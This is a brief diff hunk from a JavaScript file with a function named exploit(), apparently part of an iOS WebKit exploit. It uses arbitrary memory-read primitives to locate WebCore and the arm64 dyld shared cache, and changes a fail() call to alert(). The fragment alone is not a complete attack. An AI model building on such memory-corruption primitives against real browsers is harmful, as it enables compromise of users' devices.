@@ -556,7 +556,7 @@ function exploit(){
         while(true)
         {
         if (memory.readInt64(hdr).lo() == 4277009104) {
-          fail('WebCore ' + hdr + ' post spectre support coming soon');
+          alert('WebCore ' + hdr + ' post spectre support coming soon');
         }
         if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64"))
         {
